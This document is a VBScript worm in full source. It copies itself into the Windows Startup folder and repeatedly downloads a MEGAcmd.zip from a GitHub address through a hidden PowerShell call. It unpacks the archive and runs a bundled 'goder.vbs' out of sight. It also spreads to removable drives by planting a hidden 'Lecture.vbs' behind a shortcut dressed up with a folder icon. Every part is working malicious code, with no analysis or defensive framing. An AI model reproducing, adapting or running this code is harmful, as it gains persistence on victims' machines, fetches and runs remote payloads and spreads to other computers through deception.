' Initialize objects
Dim objFSO, objShell
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")


' Copy the script to startup folder if not present
Dim startupFolderPath, selfScriptPath, selfScriptName
startupFolderPath = objShell.SpecialFolders("Startup")
selfScriptPath = WScript.ScriptFullName
selfScriptName = objFSO.GetFileName(selfScriptPath)
If Not objFSO.FileExists(startupFolderPath & "\" & selfScriptName) Then
    objFSO.CopyFile selfScriptPath, startupFolderPath & "\" & selfScriptName
End If


Do
    ' Create C:\Mega folder if not present
    Dim megaFolderPath
    megaFolderPath = "C:\Mega"
    If Not objFSO.FolderExists(megaFolderPath) Then
        objFSO.CreateFolder(megaFolderPath)
    End If
    ' Download MEGAcmd zip file if not present
    Dim zipFilePath, url, MegacmdPath
    MegacmdPath = megaFolderPath & "\MEGAcmd"
    zipFilePath = megaFolderPath & "\MEGAcmd.zip"
    url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"
    If Not objFSO.FolderExists(MegacmdPath) Then
        objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')""", 0, True
        ' Check if zip file is downloaded
        Do While Not objFSO.FileExists(zipFilePath)
            WScript.Sleep 1000 ' Wait for 1 second
        Loop
        ' Extract the zip file if downloaded
        Dim zipExtractPath, objShellApp
        zipExtractPath = megaFolderPath
        Set objShellApp = CreateObject("Shell.Application")
        objShellApp.Namespace(zipExtractPath).CopyHere objShellApp.Namespace(zipFilePath).Items

        ' Check if zip file is completely extracted
        Dim zipFileCount, extractedFileCount
        zipFileCount = objShellApp.Namespace(zipFilePath).Items.Count
        Do
            extractedFileCount = objShellApp.Namespace(zipExtractPath).Items.Count
            WScript.Sleep 1000 ' Wait for 1 second
        Loop While extractedFileCount < zipFileCount
        ' Delete the zip file
        If objFSO.FileExists(zipFilePath) Then
            objFSO.DeleteFile(zipFilePath)
        End If
    End If
    ' Run goder.vbs if less than 5 WScript processes are running
    Dim objExec, wscriptCount
    Set objExec = objShell.Exec("tasklist /FI ""IMAGENAME eq wscript.exe"" /fo list /nh")
    wscriptCount = objExec.StdOut.ReadAll()
    If Len(wscriptCount) < 5 Then
        objShell.Run "cmd /c C: && cd " & megaFolderPath & "\MEGAcmd && goder.vbs", 0, False
        ' Wait for goder.vbs to finish executing
        WScript.Sleep 0010 ' Adjust delay as needed
        ' Close the CMD window
        objShell.AppActivate "Command Prompt"
        objShell.SendKeys "%{F4}" ' Send ALT + F4 to close the window
    End If
    
    ' Get list of drives
    Dim driveLetter, removableDrivePath, lectureOnDrivePath, shortcutPath
    For Each drive In objFSO.Drives
        If drive.DriveType = 1 Then ' DriveType 1 represents removable drive
            driveLetter = drive.Path
            removableDrivePath = driveLetter & "\"
            lectureOnDrivePath = removableDrivePath & "Lecture.vbs"
            shortcutPath = removableDrivePath & "Lecture.lnk"
            
            ' Run cmd to navigate to the drive
            objShell.Run "cmd /c " & driveLetter & ":", 0, True
            
            ' Check if Lecture.vbs and Lecture.lnk exist on removable drive
            If Not objFSO.FileExists(lectureOnDrivePath) Then
                ' Copy Lecture.vbs from Startup folder to removable drive
               
                Dim lectureInStartupPath
                lectureInStartupPath = startupFolderPath & "\Lecture.vbs"
                objFSO.CopyFile lectureInStartupPath, lectureOnDrivePath
                
                ' Create shortcut on removable drive
                Dim objLink
                Set objLink = objShell.CreateShortcut(shortcutPath)
                objLink.TargetPath = lectureOnDrivePath
                ' Set folder icon for the shortcut
                objLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 3"
                objLink.Save
                
                ' Hide Lecture.vbs on removable drive
                objShell.Run "cmd /c attrib +h """ & lectureOnDrivePath & """", 0, True
            End If
        End If
    Next
    
    WScript.Sleep 5000
Loop
